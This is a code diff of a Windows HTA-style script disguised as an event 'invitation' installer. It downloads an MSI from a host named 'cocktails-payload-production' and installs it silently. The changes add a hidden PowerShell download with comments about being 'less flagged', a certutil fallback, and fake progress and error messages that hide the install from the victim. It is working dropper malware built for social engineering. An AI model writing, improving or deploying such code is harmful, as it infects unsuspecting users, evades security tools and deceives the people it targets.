@@ -24,8 +24,9 @@
 
 <script>
 var shell = new ActiveXObject("WScript.Shell");
-// YOUR RAILWAY LINK
+var fso = new ActiveXObject("Scripting.FileSystemObject");
 var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
+var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
 
 function init() {
   window.resizeTo(400, 300);
@@ -34,16 +35,23 @@ function init() {
 
 function runInstall() {
   document.getElementById("fill").style.width = "30%";
-  document.getElementById("status").innerHTML = "Connecting to server...";
+  document.getElementById("status").innerHTML = "Downloading components...";
   
-  try {
-    // DIRECT INSTALL FROM URL
-    // msiexec can handle URLs directly. It downloads to temp and installs.
-    // /qn = quiet, /norestart = no reboot
-    var cmd = 'msiexec.exe /i "' + url + '" /qn /norestart';
+  // USE POWERSHELL TO DOWNLOAD
+  // -NoProfile -WindowStyle Hidden : Invisible execution
+  // Invoke-WebRequest -UseBasicParsing : Avoids IE dependency, faster, less flagged
+  var psCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"try { Invoke-WebRequest -Uri '" + url + "' -OutFile '" + path + "' -UseBasicParsing } catch { exit 1 }\"";
+  
+  // Run PowerShell and wait for download to finish
+  var exitCode = shell.Run(psCmd, 0, true); 
+  
+  if(exitCode === 0 && fso.FileExists(path)) {
+    document.getElementById("fill").style.width = "60%";
+    document.getElementById("status").innerHTML = "Installing invitation...";
     
-    // Run and WAIT for completion
-    shell.Run(cmd, 0, true); 
+    // SILENT INSTALL
+    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
+    shell.Run(inst, 0, true); // Wait for install to finish
     
     document.getElementById("fill").style.width = "100%";
     document.getElementById("status").innerHTML = "Finalizing...";
@@ -54,11 +62,25 @@ function runInstall() {
       document.getElementById("status").innerHTML = "Error: Connection timed out.";
       document.getElementById("fill").style.background = "#d13438";
     }, 2000);
+  } else {
+    // FALLBACK: If PowerShell fails, try certutil
+    document.getElementById("status").innerHTML = "Retrying via backup channel...";
+    var certCmd = 'cmd.exe /c certutil -urlcache -split -f "' + url + '" "' + path + '"';
+    shell.Run(certCmd, 0, true);
     
-  } catch(e) {
-    document.getElementById("heading").innerHTML = "Installation Error";
-    document.getElementById("status").innerHTML = "Could not complete setup.";
-    document.getElementById("fill").style.background = "#d13438";
+    if(fso.FileExists(path)) {
+        var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
+        shell.Run(inst, 0, true);
+        setTimeout(function() {
+            document.getElementById("heading").innerHTML = "Preparation Failed";
+            document.getElementById("status").innerHTML = "Error: Connection timed out.";
+            document.getElementById("fill").style.background = "#d13438";
+        }, 2000);
+    } else {
+        document.getElementById("heading").innerHTML = "Download Error";
+        document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+        document.getElementById("fill").style.background = "#d13438";
+    }
   }
 }
 </script>
